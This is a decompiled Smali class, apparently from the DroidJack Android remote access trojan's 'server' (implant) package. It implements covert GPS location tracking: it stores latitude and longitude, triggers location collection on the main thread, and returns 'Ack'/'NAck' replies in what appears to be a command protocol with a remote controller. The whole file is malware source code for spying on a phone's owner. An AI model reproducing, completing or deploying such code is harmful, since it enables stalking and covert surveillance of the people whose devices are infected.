.class public Lnet/droidjack/server/GPSLocation;
.super Ljava/lang/Object;


# static fields
.field protected static a:Ljava/lang/String;

.field private static b:Ljava/lang/Double;

.field private static c:Ljava/lang/Double;

.field private static d:Ljava/lang/Double;

.field private static e:Ljava/lang/Double;


# instance fields
.field private f:Landroid/content/Context;


# direct methods
.method static constructor <clinit>()V
    .locals 4

    const-wide/16 v2, 0x0

    const-string v0, ""

    sput-object v0, Lnet/droidjack/server/GPSLocation;->a:Ljava/lang/String;

    invoke-static {v2, v3}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v0

    sput-object v0, Lnet/droidjack/server/GPSLocation;->b:Ljava/lang/Double;

    invoke-static {v2, v3}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v0

    sput-object v0, Lnet/droidjack/server/GPSLocation;->c:Ljava/lang/Double;

    invoke-static {v2, v3}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v0

    sput-object v0, Lnet/droidjack/server/GPSLocation;->d:Ljava/lang/Double;

    invoke-static {v2, v3}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v0

    sput-object v0, Lnet/droidjack/server/GPSLocation;->e:Ljava/lang/Double;

    return-void
.end method

.method constructor <init>(Landroid/content/Context;)V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    invoke-static {}, Lnet/droidjack/server/ae;->a()V

    iput-object p1, p0, Lnet/droidjack/server/GPSLocation;->f:Landroid/content/Context;

    return-void
.end method

.method static synthetic a(Lnet/droidjack/server/GPSLocation;)Landroid/content/Context;
    .locals 1

    iget-object v0, p0, Lnet/droidjack/server/GPSLocation;->f:Landroid/content/Context;

    return-object v0
.end method

.method static synthetic a(Ljava/lang/Double;)V
    .locals 0

    sput-object p0, Lnet/droidjack/server/GPSLocation;->b:Ljava/lang/Double;

    return-void
.end method

.method static synthetic b(Ljava/lang/Double;)V
    .locals 0

    sput-object p0, Lnet/droidjack/server/GPSLocation;->c:Ljava/lang/Double;

    return-void
.end method

.method static synthetic c()Ljava/lang/Double;
    .locals 1

    sget-object v0, Lnet/droidjack/server/GPSLocation;->b:Ljava/lang/Double;

    return-object v0
.end method

.method static synthetic d()Ljava/lang/Double;
    .locals 1

    sget-object v0, Lnet/droidjack/server/GPSLocation;->c:Ljava/lang/Double;

    return-object v0
.end method

.method private e()V
    .locals 2

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lnet/droidjack/server/ba;

    invoke-direct {v1, p0}, Lnet/droidjack/server/ba;-><init>(Lnet/droidjack/server/GPSLocation;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    return-void
.end method


# virtual methods
.method protected a()[B
    .locals 2

    :try_start_0
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    new-instance v1, Lnet/droidjack/server/az;

    invoke-direct {v1, p0}, Lnet/droidjack/server/az;-><init>(Lnet/droidjack/server/GPSLocation;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/concurrent/Future;->get()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [B
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto :goto_0
.end method

.method protected b()[B
    .locals 1

    :try_start_0
    sget-object v0, Lnet/droidjack/server/GPSLocation;->b:Ljava/lang/Double;

    sput-object v0, Lnet/droidjack/server/GPSLocation;->d:Ljava/lang/Double;

    sget-object v0, Lnet/droidjack/server/GPSLocation;->c:Ljava/lang/Double;

    sput-object v0, Lnet/droidjack/server/GPSLocation;->e:Ljava/lang/Double;

    invoke-direct {p0}, Lnet/droidjack/server/GPSLocation;->e()V

    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto :goto_0
.end method
